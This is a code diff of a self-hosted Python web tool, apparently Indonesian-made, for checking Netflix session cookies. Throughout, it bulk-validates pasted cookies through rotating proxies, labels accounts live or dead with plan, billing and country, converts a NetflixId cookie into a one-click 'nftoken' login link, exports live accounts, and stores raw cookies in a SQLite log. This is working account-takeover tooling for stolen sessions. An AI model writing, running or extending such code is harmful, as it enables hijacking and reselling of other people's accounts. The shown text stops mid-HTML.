@@ -4,6 +4,7 @@ import os
 import random
 import re
 import socketserver
+import sqlite3
 import threading
 import time
 import urllib.parse
@@ -15,8 +16,9 @@ requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
 PORT = 8080
 PROXIES_FILE = "netflix_proxies.txt"
-
+DB_FILE = "netflix_suite.db"
 API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
+
 QUERY_PARAMS = {
     "appVersion": "15.48.1",
     "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
@@ -68,7 +70,8 @@ BASE_HEADERS = {
     "x-netflix.request.client.timezoneid": "Asia/Dhaka",
 }
 
-NETFLIX_COOKIE_NAMES = ("NetflixId", "SecureNetflixId", "NFTOKEN", "nfvdid", "OptanonConsent")
+COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
+
 COUNTRY_CODE_NAMES = {
     'AR': 'Argentina', 'AU': 'Australia', 'BR': 'Brazil', 'CA': 'Canada',
     'DE': 'Germany', 'ES': 'Spain', 'FR': 'France', 'GB': 'United Kingdom',
@@ -78,98 +81,172 @@ COUNTRY_CODE_NAMES = {
     'US': 'United States', 'VN': 'Vietnam',
 }
 
-def load_proxies():
-    if not os.path.exists(PROXIES_FILE):
-        return []
-    with open(PROXIES_FILE, "r", encoding="utf-8") as f:
-        lines = [l.strip() for l in f if l.strip() and not l.startswith("#")]
-    proxies = []
-    for l in lines:
-        parts = l.split(":")
-        if len(parts) == 4:
-            ip, port, u, p = parts
-            proxies.append(f"http://{u}:{p}@{ip}:{port}")
-        elif len(parts) == 2:
-            ip, port = parts
-            proxies.append(f"http://{ip}:{port}")
-    return proxies
+db_lock = threading.Lock()
 
-def get_proxy_dict(use_proxy):
-    if not use_proxy:
-        return None, "Direct"
-    proxies = load_proxies()
-    if not proxies:
-        return None, "Direct (No Proxy File)"
-    px = random.choice(proxies)
-    clean = px.split("@")[-1] if "@" in px else px
-    return {"http": px, "https": px}, f"Proxy ({clean})"
+def init_db():
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        c = conn.cursor()
+        c.execute('''
+            CREATE TABLE IF NOT EXISTS history (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                created_at TEXT,
+                type TEXT,
+                status TEXT,
+                plan TEXT,
+                billing TEXT,
+                country TEXT,
+                route TEXT,
+                token_url TEXT,
+                raw_cookie TEXT
+            )
+        ''')
+        conn.commit()
+        conn.close()
 
-def extract_cookie_values(cookie_text):
-    cookies = {}
-    if not cookie_text:
-        return cookies
-
-    text = str(cookie_text).strip()
-
-    # JSON export handling
-    if text.startswith("{") or text.startswith("["):
+def save_history(entry_type, status, plan='', billing='', country='', route='', token_url='', raw_cookie=''):
+    with db_lock:
         try:
-            data = json.loads(text)
-            if isinstance(data, list):
-                for item in data:
-                    if isinstance(item, dict):
-                        n = item.get("name")
-                        v = item.get("value")
-                        if n and v:
-                            cookies[n] = urllib.parse.unquote(v) if "%" in v else v
-            elif isinstance(data, dict):
-                for k, v in data.items():
-                    if isinstance(v, str):
-                        cookies[k] = urllib.parse.unquote(v) if "%" in v else v
+            conn = sqlite3.connect(DB_FILE)
+            c = conn.cursor()
+            c.execute('''
+                INSERT INTO history (created_at, type, status, plan, billing, country, route, token_url, raw_cookie)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+            ''', (
+                datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                entry_type,
+                status,
+                plan,
+                billing,
+                country,
+                route,
+                token_url,
+                raw_cookie[:500]
+            ))
+            conn.commit()
+            conn.close()
         except Exception:
             pass
 
-    # Netscape format
-    for line in text.splitlines():
-        line = line.strip()
+def get_history(limit=50):
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        c = conn.cursor()
+        c.execute('''
+            SELECT id, created_at, type, status, plan, billing, country, route, token_url
+            FROM history
+            ORDER BY id DESC
+            LIMIT ?
+        ''', (limit,))
+        rows = c.fetchall()
+        conn.close()
+        return [
+            {
+                "id": r[0], "created_at": r[1], "type": r[2], "status": r[3],
+                "plan": r[4], "billing": r[5], "country": r[6], "route": r[7], "token_url": r[8]
+            }
+            for r in rows
+        ]
+
+def clear_history():
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        c = conn.cursor()
+        c.execute('DELETE FROM history')
+        conn.commit()
+        conn.close()
+
+def load_proxies():
+    if not os.path.exists(PROXIES_FILE):
+        return []
+    res = []
+    with open(PROXIES_FILE, "r", encoding="utf-8", errors="ignore") as f:
+        for line in f:
+            p = line.strip()
+            if not p or p.startswith("#"):
+                continue
+            parts = p.split(":")
+            if len(parts) == 4:
+                ip, port, user, pwd = parts
+                res.append({"raw": f"{ip}:{port}", "proxy": f"http://{user}:{pwd}@{ip}:{port}"})
+            elif len(parts) == 2:
+                ip, port = parts
+                res.append({"raw": f"{ip}:{port}", "proxy": f"http://{ip}:{port}"})
+    return res
+
+def get_random_proxy():
+    pool = load_proxies()
+    if not pool:
+        return None, None
+    choice = random.choice(pool)
+    return {"http": choice["proxy"], "https": choice["proxy"]}, choice["raw"]
+
+def extract_cookie_values(text):
+    cookie_dict = {}
+    if not text:
+        return cookie_dict
+
+    text = str(text).strip()
+    for raw_line in text.splitlines():
+        line = raw_line.strip()
         if not line or line.startswith("#"):
             continue
         parts = line.split("\t")
         if len(parts) >= 7:
-            cookies[parts[5]] = urllib.parse.unquote(parts[6]) if "%" in parts[6] else parts[6]
+            cookie_dict[parts[5]] = parts[6]
 
-    # Header / Key=Value string parsing
-    for part in re.split(r'[;\n\r]+', text):
-        if "=" in part:
-            k, v = part.split("=", 1)
-            k = k.strip()
-            v = v.strip().rstrip(".")
-            if k in NETFLIX_COOKIE_NAMES and v:
-                cookies[k] = urllib.parse.unquote(v) if "%" in v else v
+    try:
+        data = json.loads(text)
+    except Exception:
+        data = None
 
-    # Fallback regex search
-    for name in NETFLIX_COOKIE_NAMES:
-        if name not in cookies:
-            m = re.search(rf'(?:^|[;\s|,{{])["\']?{re.escape(name)}["\']?\s*[:=]\s*["\']?([^"\'\s;,|}}]+)', text)
+    if isinstance(data, list):
+        for c in data:
+            if isinstance(c, dict):
+                n, v = c.get("name"), c.get("value")
+                if n in COOKIE_KEYS and isinstance(v, str):
+                    cookie_dict[n] = urllib.parse.unquote(v) if "%" in v else v
+    elif isinstance(data, dict):
+        for k in COOKIE_KEYS:
+            v = data.get(k)
+            if isinstance(v, str):
+                cookie_dict[k] = urllib.parse.unquote(v) if "%" in v else v
+
+    for k in COOKIE_KEYS:
+        if k not in cookie_dict:
+            m = re.search(rf"(?<!\w){re.escape(k)}=([^;,\s]+)", text)
             if m:
-                v = m.group(1).strip().rstrip(".")
-                cookies[name] = urllib.parse.unquote(v) if "%" in v else v
+                v = m.group(1)
+                cookie_dict[k] = urllib.parse.unquote(v) if "%" in v else v
 
-    return cookies
+    for k in list(cookie_dict.keys()):
+        if isinstance(cookie_dict[k], str):
+            cookie_dict[k] = cookie_dict[k].strip().rstrip('.')
+
+    return cookie_dict
+
+def normalize_country(code):
+    if not code:
+        return 'Unknown'
+    c = str(code).strip().upper()
+    if len(c) == 2 and c.isalpha():
+        return f"{COUNTRY_CODE_NAMES.get(c, c)} ({c})"
+    return c
 
 def generate_nftoken(cookie_text, use_proxy=True):
     cookies = extract_cookie_values(cookie_text)
     nid = cookies.get("NetflixId")
     if not nid:
-        raise ValueError("NetflixId cookie tidak ditemukan.")
+        save_history("nftoken", "DEAD", raw_cookie=cookie_text)
+        raise ValueError("Cookie NetflixId tidak ditemukan.")
 
     headers = dict(BASE_HEADERS)
     headers["Cookie"] = f"NetflixId={nid}"
 
-    proxy_dict, route = get_proxy_dict(use_proxy)
-    kw = {"proxies": proxy_dict} if proxy_dict else {}
+    proxies, proxy_label = get_random_proxy() if use_proxy else (None, None)
+    route = f"Proxy ({proxy_label})" if proxy_label else "Direct"
 
-    res = requests.get(API_URL, params=QUERY_PARAMS, headers=headers, timeout=25, verify=False, **kw)
+    res = requests.get(API_URL, params=QUERY_PARAMS, headers=headers, proxies=proxies, timeout=20, verify=False)
     res.raise_for_status()
 
     data = res.json()
@@ -180,262 +257,210 @@ def generate_nftoken(cookie_text, use_proxy=True):
     token = token_node.get("token")
     expires = token_node.get("expires")
     if not token:
-        raise ValueError("Netflix tidak mengembalikan NFToken (Cookie mungkin mati/expired).")
+        save_history("nftoken", "DEAD", route=route, raw_cookie=cookie_text)
+        raise ValueError("Netflix tidak mengembalikan token. Cookie mati/invalid.")
 
     exp_str = "Unknown"
     if isinstance(expires, (int, float)):
         ts = expires // 1000 if len(str(int(expires))) == 13 else expires
         exp_str = datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")
 
-    return f"https://netflix.com/?nftoken={token}", exp_str, route
-
-def normalize_country(code):
-    if not code:
-        return "Unknown"
-    code = code.strip().upper()
-    return f"{COUNTRY_CODE_NAMES.get(code, code)} ({code})" if code in COUNTRY_CODE_NAMES else code
+    token_url = f"https://netflix.com/?nftoken={token}"
+    save_history("nftoken", "LIVE", route=route, token_url=token_url, raw_cookie=cookie_text)
+    return token_url, exp_str, route
 
 def check_netflix_membership(cookie_text, use_proxy=True):
     cookies = extract_cookie_values(cookie_text)
     if "NetflixId" not in cookies:
+        save_history("checker", "DEAD", raw_cookie=cookie_text)
         return {"live": False, "reason": "Cookie NetflixId tidak ditemukan."}
 
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-        'Accept-Language': 'en-US,en;q=0.9',
+        'Accept-Language': 'en-US,en;q=0.5',
         'Referer': 'https://www.netflix.com/browse',
     }
 
-    proxy_dict, route = get_proxy_dict(use_proxy)
-    kw = {"proxies": proxy_dict} if proxy_dict else {}
+    proxies, proxy_label = get_random_proxy() if use_proxy else (None, None)
+    route = f"Proxy ({proxy_label})" if proxy_label else "Direct"
 
-    session = requests.Session()
     try:
-        # Pre-visit browse
-        session.get('https://www.netflix.com/browse', headers=headers, cookies=cookies, timeout=15, **kw)
-        
-        cookie_header = '; '.join(f"{k}={v}" for k, v in cookies.items())
-        headers['Cookie'] = cookie_header
-        r = session.get('https://www.netflix.com/account/membership', headers=headers, timeout=15, **kw)
+        session = requests.Session()
+        ck_header = "; ".join(f"{k}={v}" for k, v in cookies.items())
+        headers['Cookie'] = ck_header
 
-        if r.status_code != 200:
-            return {"live": False, "status_code": r.status_code, "reason": "Dead (Status not 200)", "route": route}
+        r = session.get(
+            'https://www.netflix.com/account/membership',
+            headers=headers,
+            proxies=proxies,
+            timeout=15,
+            allow_redirects=True,
+            verify=False
+        )
+
+        if "login" in r.url.lower() or r.status_code in (401, 403) or 'data-uia="login-page"' in r.text:
+            save_history("checker", "DEAD", route=route, raw_cookie=cookie_text)
+            return {"live": False, "reason": "Cookie Expired / Terlempar ke Login.", "route": route}
 
         html = r.text
-        if "account-membership-page" not in html and "membership" not in r.url:
-            return {"live": False, "reason": "Redirected ke login/homepage (Dead cookie)", "route": route}
-
-        # Extract plan
-        if re.search(r'4K video resolution[^<]*?(?:spatial audio|ad-free)', html, re.I):
-            plan = "Premium 4K"
+        plan_detected = 'Live (Standard/Basic)'
+        if re.search(r'4K video resolution[^<]*?(?:spatial audio|ad-free)', html, re.I) or 'Premium' in html:
+            plan_detected = 'Premium 4K'
         else:
-            plan_match = re.search(r'data-uia="account-membership-page\+plan-card\+title"[^>]*>([^<]{1,40}?)<', html)
-            plan = plan_match.group(1).strip() if plan_match else "Live (Standard/Basic)"
+            plan_match = re.search(r'data-uia="account-membership-page\+plan-card\+title"[^>]*>([^<]{1,30}?)<', html)
+            if plan_match:
+                plan_detected = plan_match.group(1).strip()
 
-        # Extract payment date
         date_match = re.search(
-            r'<h3[^>]*data-uia="account-membership-page\+payments-card\+title"[^>]*>Next payment</h3>[^<]*<p[^>]*data-uia="account-membership-page\+payments-card\+description"[^>]*>([^<]+?)</p>',
+            r'data-uia="account-membership-page\+payments-card\+title"[^>]*>Next payment</h3>[^<]*<p[^>]*data-uia="account-membership-page\+payments-card\+description"[^>]*>([^<]+?)</p>',
             html, re.DOTALL | re.I
         )
-        billing = date_match.group(1).strip() if date_match else "N/A"
+        billing = date_match.group(1).strip() if date_match else 'N/A'
 
-        # Extract country
-        country_code = None
-        for pat in (r'"countryOfSignup"\s*:\s*"([A-Za-z]{2})"', r'"currentCountry"\s*:\s*"([A-Za-z]{2})"', r'"memberCountry"\s*:\s*"([A-Za-z]{2})"', r'"paymentCountry"\s*:\s*"([A-Za-z]{2})"', r'"countryCode"\s*:\s*"([A-Za-z]{2})"'):
-            m = re.search(pat, html)
-            if m:
-                country_code = m.group(1)
-                break
+        country_match = re.search(r'"(?:countryOfSignup|currentCountry|memberCountry|geoCountry)"\s*:\s*"([A-Za-z]{2})"', html)
+        country = normalize_country(country_match.group(1)) if country_match else 'Unknown'
 
-        # Exportable Cookie-Editor array
-        cookie_editor_json = [
+        editor_cookies = [
             {"domain": ".netflix.com", "name": k, "path": "/", "secure": True, "httpOnly": True, "value": v}
-            for k, v in cookies.items() if k in NETFLIX_COOKIE_NAMES
+            for k, v in cookies.items()
         ]
+
+        save_history("checker", "LIVE", plan=plan_detected, billing=billing, country=country, route=route, raw_cookie=cookie_text)
 
         return {
             "live": True,
-            "plan": plan,
+            "plan": plan_detected,
             "billing": billing,
-            "country": normalize_country(country_code),
-            "cookies": cookie_editor_json,
+            "country": country,
+            "cookies": editor_cookies,
             "route": route
         }
     except Exception as e:
-        return {"live": False, "reason": f"Request error: {str(e)}", "route": route}
+        save_history("checker", "ERROR", route=route, raw_cookie=cookie_text)
+        return {"live": False, "reason": f"Request gagal: {str(e)}", "route": route}
 
-HTML_PAGE = """<!DOCTYPE html>
+HTML = """<!DOCTYPE html>
 <html lang="id">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Netflix Suite — NFToken & Account Checker</title>
+<title>Netflix Suite Pro — NFToken, Bulk Checker & History</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
 <style>
 :root {
+  --bg-main: #0c0d10;
+  --bg-card: #15171e;
+  --bg-input: #090a0d;
+  --border: #262934;
   --primary: #e50914;
-  --primary-hover: #b80710;
-  --bg: #0d0e12;
-  --panel: #16181f;
-  --panel-border: #262933;
-  --panel-hover: #1e212b;
-  --text: #f0f2f5;
+  --primary-hover: #f40612;
+  --text-main: #f1f3f7;
   --text-muted: #8b92a5;
-  --success: #10b981;
-  --success-bg: rgba(16, 185, 129, 0.12);
-  --error: #ef4444;
-  --error-bg: rgba(239, 68, 68, 0.12);
-  --warning: #f59e0b;
+  --green: #22c55e;
+  --green-bg: rgba(34, 197, 94, 0.1);
+  --red: #ef4444;
+  --red-bg: rgba(239, 68, 68, 0.1);
 }
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body {
-  font-family: 'Plus Jakarta Sans', sans-serif;
-  background-color: var(--bg);
-  color: var(--text);
+  font-family: 'Inter', system-ui, -apple-system, sans-serif;
+  background-color: var(--bg-main);
+  color: var(--text-main);
   min-height: 100vh;
   display: flex;
   flex-direction: column;
   align-items: center;
-  padding: 36px 16px 60px;
+  padding: 30px 16px;
 }
-.app-container {
+.container {
   width: 100%;
-  max-width: 760px;
+  max-width: 860px;
+  background-color: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 14px;
+  padding: 28px;
+  box-shadow: 0 20px 40px rgba(0,0,0,0.6);
 }
-header {
-  text-align: center;
-  margin-bottom: 28px;
-}
-.brand-badge {
-  display: inline-flex;
+.header {
+  display: flex;
   align-items: center;
-  gap: 6px;
-  background: rgba(229, 9, 20, 0.15);
-  color: #ff4d55;
-  padding: 4px 12px;
-  border-radius: 999px;
-  font-size: 12px;
+  justify-content: space-between;
+  margin-bottom: 24px;
+  border-bottom: 1px solid var(--border);
+  padding-bottom: 18px;
+  flex-wrap: wrap;
+  gap: 12px;
+}
+.brand { display: flex; align-items: center; gap: 12px; }
+.brand h1 { font-size: 20px; font-weight: 700; letter-spacing: -0.5px; }
+.brand span { color: var(--primary); }
+.badge {
+  font-size: 11px;
   font-weight: 600;
+  background: #232733;
+  color: var(--text-muted);
+  padding: 4px 8px;
+  border-radius: 6px;
   text-transform: uppercase;
   letter-spacing: 0.5px;
-  margin-bottom: 12px;
-  border: 1px solid rgba(229, 9, 20, 0.3);
 }
-h1 {
-  font-size: 28px;
-  font-weight: 700;
-  letter-spacing: -0.8px;
-  color: #fff;
-  margin-bottom: 6px;
-}
-header p {
-  color: var(--text-muted);
-  font-size: 14px;
-}
-
-/* Tabs */
 .tabs {
-  display: flex;
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
   gap: 8px;
-  background: #111318;
+  background: var(--bg-input);
   padding: 4px;
   border-radius: 10px;
-  border: 1px solid var(--panel-border);
   margin-bottom: 20px;
+  border: 1px solid var(--border);
 }
 .tab-btn {
-  flex: 1;
-  padding: 10px 16px;
-  background: transparent;
+  padding: 10px;
   border: 0;
+  background: transparent;
   color: var(--text-muted);
   font-weight: 600;
-  font-size: 14px;
-  border-radius: 8px;
+  font-size: 13px;
+  border-radius: 7px;
   cursor: pointer;
   transition: all 0.2s;
-  font-family: inherit;
+  text-align: center;
 }
-.tab-btn.active {
-  background: var(--panel-border);
-  color: #fff;
-}
-
-/* Card */
-.card {
-  background: var(--panel);
-  border: 1px solid var(--panel-border);
-  border-radius: 14px;
-  padding: 26px;
-  box-shadow: 0 12px 36px rgba(0,0,0,0.4);
-}
-label {
+.tab-btn.active { background: var(--bg-card); color: var(--text-main); box-shadow: 0 2px 8px rgba(0,0,0,0.4); }
+.proxy-bar {
   display: flex;
+  align-items: center;
   justify-content: space-between;
+  background: rgba(255,255,255,0.02);
+  border: 1px solid var(--border);
+  padding: 10px 14px;
+  border-radius: 8px;
+  margin-bottom: 20px;
   font-size: 13px;
-  font-weight: 600;
-  color: var(--text-muted);
-  margin-bottom: 8px;
 }
-.input-wrap { position: relative; }
+.toggle-wrap { display: flex; align-items: center; gap: 8px; cursor: pointer; user-select: none; }
+.toggle-wrap input { accent-color: var(--primary); cursor: pointer; }
+.section-panel { display: none; }
+.section-panel.active { display: block; }
+label { display: block; font-size: 13px; font-weight: 500; color: var(--text-muted); margin-bottom: 8px; }
 textarea {
   width: 100%;
   height: 140px;
-  background: #0d0e12;
-  color: #fff;
-  border: 1px solid var(--panel-border);
+  background: var(--bg-input);
+  border: 1px solid var(--border);
   border-radius: 8px;
   padding: 12px;
+  color: #fff;
   font-family: 'JetBrains Mono', monospace;
-  font-size: 12px;
-  line-height: 1.5;
-  resize: vertical;
-  outline: none;
-  transition: border-color 0.2s;
-}
-textarea:focus {
-  border-color: var(--primary);
-}
-
-.options-row {
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  margin-top: 14px;
-  padding-top: 14px;
-  border-top: 1px solid rgba(255,255,255,0.05);
-}
-.chk-label {
-  display: inline-flex;
-  align-items: center;
-  gap: 8px;
   font-size: 13px;
-  color: var(--text-muted);
-  cursor: pointer;
-  user-select: none;
+  resize: vertical;
+  margin-bottom: 16px;
 }
-.chk-label input {
-  accent-color: var(--primary);
-  width: 16px;
-  height: 16px;
-  cursor: pointer;
-}
-.badge-proxy {
-  font-size: 11px;
-  color: #4ade80;
-  background: rgba(74, 222, 128, 0.1);
-  padding: 2px 8px;
-  border-radius: 4px;
-  border: 1px solid rgba(74, 222, 128, 0.2);
-  font-family: 'JetBrains Mono', monospace;
-}
-
-/* Buttons */
-.btn-submit {
+textarea:focus { outline: none; border-color: var(--primary); }
+.btn-primary {
   width: 100%;
-  margin-top: 16px;
   padding: 12px;
   background: var(--primary);
   color: #fff;
@@ -443,378 +468,452 @@ textarea:focus {
   border-radius: 8px;
   font-size: 14px;
   font-weight: 600;
-  font-family: inherit;
   cursor: pointer;
   display: flex;
-  align-items: center;
   justify-content: center;
-  gap: 8px;
-  transition: background 0.15s, transform 0.05s;
-}
-.btn-submit:hover {
-  background: var(--primary-hover);
-}
-.btn-submit:active {
-  transform: scale(0.99);
-}
-.btn-submit:disabled {
-  opacity: 0.6;
-  cursor: not-allowed;
-}
-
-/* Results */
-.result-box {
-  margin-top: 22px;
-  display: none;
-  border-radius: 10px;
-  padding: 18px;
-  font-size: 13px;
-}
-.result-box.success {
-  background: var(--success-bg);
-  border: 1px solid rgba(16, 185, 129, 0.3);
-  color: #e6fffa;
-}
-.result-box.error {
-  background: var(--error-bg);
-  border: 1px solid rgba(239, 68, 68, 0.3);
-  color: #fee2e2;
-}
-
-.res-header {
-  display: flex;
-  justify-content: space-between;
   align-items: center;
-  font-weight: 700;
-  font-size: 15px;
-  margin-bottom: 12px;
-}
-.pill {
-  padding: 2px 8px;
-  border-radius: 4px;
-  font-size: 11px;
-  font-weight: 600;
-  text-transform: uppercase;
-}
-.pill-live { background: var(--success); color: #000; }
-.pill-dead { background: var(--error); color: #fff; }
-
-.link-field {
-  display: flex;
   gap: 8px;
-  margin-top: 8px;
 }
-.link-input {
-  flex: 1;
-  background: #090a0d;
-  border: 1px solid var(--panel-border);
-  padding: 8px 12px;
-  border-radius: 6px;
-  font-family: 'JetBrains Mono', monospace;
-  font-size: 12px;
-  color: #7dd3fc;
-  text-decoration: none;
-  overflow: hidden;
-  text-overflow: ellipsis;
-  white-space: nowrap;
-}
-.btn-mini {
+.btn-primary:hover { background: var(--primary-hover); }
+.btn-primary:disabled { opacity: 0.5; cursor: not-allowed; }
+.btn-secondary {
   padding: 8px 14px;
-  background: #272a36;
-  border: 1px solid #3c4052;
-  color: #fff;
+  background: #232733;
+  color: var(--text-main);
+  border: 1px solid var(--border);
   border-radius: 6px;
   font-size: 12px;
   font-weight: 600;
   cursor: pointer;
-  white-space: nowrap;
 }
-.btn-mini:hover { background: #333847; }
-
-.grid-info {
+.btn-secondary:hover { background: #2d3242; }
+.card-out {
+  margin-top: 20px;
+  border-radius: 10px;
+  padding: 16px;
+  border: 1px solid;
+  font-size: 13px;
+  display: none;
+}
+.card-out.live { background: var(--green-bg); border-color: var(--green); }
+.card-out.dead { background: var(--red-bg); border-color: var(--red); }
+.grid-meta {
   display: grid;
-  grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
-  gap: 10px;
-  margin: 14px 0 8px;
+  grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+  gap: 12px;
+  margin: 12px 0;
 }
-.info-card {
+.meta-box {
   background: rgba(0,0,0,0.3);
   padding: 10px;
   border-radius: 6px;
-  border: 1px solid rgba(255,255,255,0.06);
+  border: 1px solid rgba(255,255,255,0.05);
 }
-.info-title { font-size: 11px; color: var(--text-muted); margin-bottom: 2px; text-transform: uppercase; }
-.info-val { font-size: 14px; font-weight: 600; color: #fff; }
-
-footer {
-  margin-top: auto;
-  text-align: center;
-  font-size: 12px;
-  color: var(--text-muted);
-  padding-top: 30px;
+.meta-box span { display: block; font-size: 11px; color: var(--text-muted); margin-bottom: 2px; }
+.meta-box strong { font-size: 14px; color: #fff; }
+.token-link {
+  word-break: break-all;
+  background: rgba(0,0,0,0.4);
+  padding: 10px;
+  border-radius: 6px;
+  font-family: 'JetBrains Mono', monospace;
+  margin-top: 8px;
+  border: 1px dashed rgba(255,255,255,0.15);
 }
+.token-link a { color: #60a5fa; text-decoration: none; }
+.token-link a:hover { text-decoration: underline; }
+.action-row { display: flex; gap: 8px; margin-top: 12px; }
+.progress-wrap { margin-top: 16px; display: none; }
+.progress-bar-bg { width: 100%; height: 8px; background: #232733; border-radius: 4px; overflow: hidden; margin-top: 6px; }
+.progress-bar-fill { height: 100%; width: 0%; background: var(--primary); transition: width 0.2s; }
+.bulk-stats { display: flex; gap: 14px; font-size: 13px; margin: 12px 0; font-weight: 600; }
+.table-wrap { overflow-x: auto; margin-top: 14px; max-height: 400px; }
+table { width: 100%; border-collapse: collapse; font-size: 12px; text-align: left; }
+th, td { padding: 10px; border-bottom: 1px solid var(--border); }
+th { background: #1a1d26; color: var(--text-muted); font-weight: 600; position: sticky; top: 0; }
+tr:hover { background: rgba(255,255,255,0.02); }
+.tag-live { color: var(--green); font-weight: 600; }
+.tag-dead { color: var(--red); font-weight: 600; }
 </style>
 </head>
 <body>
-
-<div class="app-container">
-  <header>
-    <div class="brand-badge">⚡ Netflix Tool Suite</div>
-    <h1>NFToken & Cookie Checker</h1>
-    <p>Generate login link langsung atau validasi status langganan akun Netflix.</p>
-  </header>
+<div class="container">
+  <div class="header">
+    <div class="brand">
+      <h1>Netflix <span>Suite Pro</span></h1>
+      <span class="badge">v3.0 SQLite</span>
+    </div>
+    <div style="font-size:12px; color:var(--text-muted);">Self-Hosted Local Server</div>
+  </div>
 
   <div class="tabs">
-    <button class="tab-btn active" onclick="switchTab('nftoken')">🔗 NFToken Generator</button>
-    <button class="tab-btn" onclick="switchTab('checker')">🛡️ Account Membership Checker</button>
+    <button class="tab-btn active" onclick="switchTab('single')">Single Check / NFToken</button>
+    <button class="tab-btn" onclick="switchTab('bulk')">Bulk Mass Checker</button>
+    <button class="tab-btn" onclick="switchTab('history')">History Database</button>
   </div>
 
-  <div class="card">
-    <label>
-      <span id="input-label">Cookie Netflix</span>
-      <span style="font-weight:normal; font-size:11px;">Mendukung: Netscape / JSON / Raw Header</span>
-    </label>
-    
-    <div class="input-wrap">
-      <textarea id="cookie-input" placeholder="Paste NetflixId=...; SecureNetflixId=... atau format JSON/Netscape di sini"></textarea>
+  <div class="proxy-bar">
+    <div class="toggle-wrap" onclick="document.getElementById('proxy-toggle').click()">
+      <input type="checkbox" id="proxy-toggle" checked onclick="event.stopPropagation()">
+      <span>Gunakan Proxy Rotasi (Webshare)</span>
     </div>
+    <span id="proxy-count-label" style="color:var(--text-muted)">Memuat proxy...</span>
+  </div>
 
-    <div class="options-row">
-      <label class="chk-label">
-        <input type="checkbox" id="chk-proxy" checked>
-        Pakai Proxy Webshare Rotasi
-      </label>
-      <span class="badge-proxy">20 Proxies Active</span>
+  <!-- PANEL 1: SINGLE -->
+  <div id="panel-single" class="section-panel active">
+    <div style="display:flex; gap:10px; margin-bottom:12px;">
+      <label style="cursor:pointer;"><input type="radio" name="single-mode" value="nftoken" checked onchange="toggleSingleMode()"> Mode: NFToken URL</label>
+      <label style="cursor:pointer;"><input type="radio" name="single-mode" value="checker" onchange="toggleSingleMode()"> Mode: Membership Checker</label>
     </div>
-
-    <button id="btn-action" class="btn-submit" onclick="executeAction()">
-      <span>Eksekusi</span>
+    <textarea id="single-cookie" placeholder="Paste cookie di sini (Raw, JSON, Netscape)..."></textarea>
+    <button id="single-btn" class="btn-primary" onclick="runSingle()">
+      <span id="single-btn-text">Generate NFToken</span>
     </button>
-
-    <div id="output-box" class="result-box"></div>
+    <div id="single-out" class="card-out"></div>
   </div>
 
-  <footer>
-    Netflix Tool Suite &bull; Webshare Multi-Proxy Backend &bull; 2026
-  </footer>
+  <!-- PANEL 2: BULK -->
+  <div id="panel-bulk" class="section-panel">
+    <label>Paste multi-line cookies (1 baris = 1 akun / cookie):</label>
+    <textarea id="bulk-input" style="height:180px;" placeholder="NetflixId=...&#10;NetflixId=...; SecureNetflixId=...&#10;user:pass | Cookie = NetflixId=..."></textarea>
+    <div style="display:flex; gap:8px; margin-bottom:12px;">
+      <button id="bulk-btn" class="btn-primary" style="flex:2;" onclick="runBulk()">Mulai Bulk Check</button>
+      <button class="btn-secondary" style="flex:1;" onclick="stopBulk()">Stop</button>
+    </div>
+    <div id="bulk-progress" class="progress-wrap">
+      <div style="display:flex; justify-content:space-between; font-size:12px;">
+        <span id="progress-status">Memeriksa 0/0...</span>
+        <span id="progress-percent">0%</span>
+      </div>
+      <div class="progress-bar-bg"><div id="progress-fill" class="progress-bar-fill"></div></div>
+    </div>
+    <div class="bulk-stats">
+      <span>Total: <span id="stat-total">0</span></span>
+      <span style="color:var(--green)">Live: <span id="stat-live">0</span></span>
+      <span style="color:#60a5fa">4K: <span id="stat-4k">0</span></span>
+      <span style="color:var(--red)">Dead: <span id="stat-dead">0</span></span>
+    </div>
+    <div class="action-row">
+      <button class="btn-secondary" onclick="exportBulk('txt')">Export Live (TXT)</button>
+      <button class="btn-secondary" onclick="exportBulk('json')">Export Live (JSON)</button>
+    </div>
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr><th>#</th><th>Status</th><th>Plan</th><th>Billing</th><th>Country</th><th>Route</th></tr>
+        </thead>
+        <tbody id="bulk-tbody"></tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- PANEL 3: HISTORY -->
